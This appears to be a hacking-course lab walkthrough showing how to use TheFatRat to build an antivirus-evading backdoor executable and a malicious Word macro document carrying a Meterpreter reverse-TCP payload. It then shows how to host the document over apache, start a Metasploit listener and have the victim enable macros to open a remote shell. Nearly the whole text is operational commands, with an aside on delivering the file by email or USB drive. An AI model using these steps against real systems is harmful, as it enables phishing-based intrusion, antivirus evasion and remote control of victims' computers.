- Social engineering is one of hackers’ most typically used attacks. As recent trends suggest, many big organizations fall victim to this attack vector. The attackers trick an employee of a workplace into clicking links in a legitimate-looking document, which turns out to be malicious and can even evade anti-virus programs.

- TheFatRat is an exploitation tool that compiles malware with a popular payload that can then be executed on Windows, Android, and Mac OSes. The software offers an easy way to create backdoors and payloads that can bypass most anti-viruses.
- Open terminal
	> fatrat
	> 6 (**Create Fud Backdoor 1000% with PwnWinds [Excelent]**)
	> 3 (**Create exe file with apache + Powershell (FUD 100%)**)
	> enter #hostip (for set LHOST)
	> 4444 (for set LPORT)
	
		- For the **Please enter the base name for output files** option,
	> payload
	> 3 (For the **Choose Payload** option, choose **windows/meterpreter/reverse_tcp**)

		- To navigate to the **root** directory, click **Places** from the top-section of the **Desktop** and click **Home Folder** from the drop-down options. The **attacker** window appears, click **File System** from the left-pane and then double-click **root** from the right-pane.
		- **TheFatRat** generates a **payload.exe** file located at **root/Fatrat_Generated**.
		- now back to terminal
	> 9 (for back to menu)
	> 7 (**Create Backdoor For Office with Microsploit**)
	> 2 (**The Microsoft Office Macro on Windows**)
	> enter #hostip (for set LHOST)
	> 4444 (for set LPORT)
	> Enter filename (BadDoc)
	> type message
	> y
	> /root/Fatrat_generated/filename.exe (for path option)
	> 3 (for choose payload, choose **windows/meterpreter/reverse_tcp**)
	
	- Now open new terminal
		> cp /root/Fatrat_Generated/BadDoc.docm (filename) /var/www/html/share

			 - Here, we are sending the malicious payload through a shared directory; but in real-time, you can send it via an attachment in the email or through physical means such as a hard drive or pen drive.
		> service apache2 start (to start apache service)
		> msfconsole (to open metasploit framework)
		> use exploit/multi/handler

		- Now, we need to set the payload, LHOST, and LPORT. To do so, use the below commands:
			> set payload windows/meterpreter/reverse_tcp
			> set LHOST #hostip 
			> set LPORT 4444
			> exploit
			
		- Now go to windows machine, i.e, target machine
		- enter http://#hostip/share in a browser
		- download Baddoc.docm and run it
		- A **Microsoft Word** document appears with the file in **PROTECTED VIEW**. Click **Enable Editing**.
		- A **SECURITY WARNING** appears; click **Enable Content**.
		- now go back to linux host machine and notice session created or opened in meterpreter shell
		- type sysinfo to view system details of exploited computer.